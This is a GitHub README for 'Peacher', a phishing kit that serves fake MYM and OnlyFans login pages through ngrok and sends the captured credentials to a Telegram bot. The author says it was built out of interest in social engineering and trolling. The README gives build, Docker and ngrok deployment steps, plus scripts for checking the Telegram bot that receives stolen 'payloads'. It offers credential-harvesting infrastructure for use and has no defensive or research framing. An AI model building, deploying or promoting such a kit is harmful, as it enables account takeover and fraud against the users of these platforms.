<p align="center">
  <img src="https://github.com/Yekuuun/peacher/blob/main/assets/peacher.webp" alt="Description de l'image" width="300">
</p>
<div align="center">
  <h1>Peacher</h1>
  <p><strong>A base POC for MYM & OF phishing</strong></p>
</div>

## What's Peacher ?

Peacher is a minimalist POC implementating a base phishing framework for MYM & OF **user accounts** using a telegram bot as a saving. It was developped due to my interest for social engineering & trolling.

>[!Important]
>This project was developped as a test & contains simple code snippets. It represent a base test for maybe later improves ?;)

---

## Features

- ✅ Base MYM & OF login page templates
- ✅ Ngrok online bridge (consider using real domains or premium ngrok versions)
- ✅ GO for fast & easy deploy
- ✅ Docker full containerization
- ✅ Telegram integration => avoids using a real Database. use a bot for faster usage

<br>

## Build & Run

### Prerequisites

- Golang 1.23 (version used for Peacher)
- Docker
- Telegram

### ⚠️ Notes

When cloning the repo, you'll have to setup **.env** files. Without those configuration, you won't be able to launch the solution. The project contains 2 .env file, one in `/peacher` for the telegram configuration and one at root of the project for the ngrok auth token. You'll have to create 2 `.env` files based on `.env.example` files.

<br>

### Creating a Telegram bot

Without the bot, you won't receive any payloads... so it's crucial to configure it.

<a href="https://core.telegram.org/bots/tutorial" target="_blank">Official documentation</a>

Once you've create your bot, use the 2 scripts in `/peacher/scripts` to check the status of your bot & get basic informations like chat_id etc.

```bash

#!/bin/bash

#loading environment variables.
set -a
source ../.env
set +a

#calling telegram api.
echo "TELEGRAM BOT STATUS :"
curl -s "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/getMe" | jq -r '.ok'

```

```bash

#!/bin/bash

set -a 
source ../.env
set +a

#get informations
curl -s "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/getUpdates" | jq

```

<br>

### Install

Clone repository
```bash
git clone https://github.com/Yekuuun/peacher.git

```

Running containers
```bash
cd peacher

docker compose up -d
```

Go to ngrok bridge (your navigator) to get the ngrok link

```bash
http://localhost:4040

```
<img src="https://github.com/Yekuuun/peacher/blob/main/assets/ngrok.png" alt="DebugInfo" />

Check you ngrok hosting. go to <your_ngrok_url>/mym for example

<img src="https://github.com/Yekuuun/peacher/blob/main/assets/mym.png" alt="DebugInfo" />


<br>

## Preview

<img src="https://github.com/Yekuuun/peacher/blob/main/assets/peacher-bot.png" alt="DebugInfo" />

<img src="https://github.com/Yekuuun/peacher/blob/main/assets/preview.png" alt="DebugInfo" />


<br>

### Built with ⚡

<img src="https://skillicons.dev/icons?i=css,html,go,docker,ngrok" />
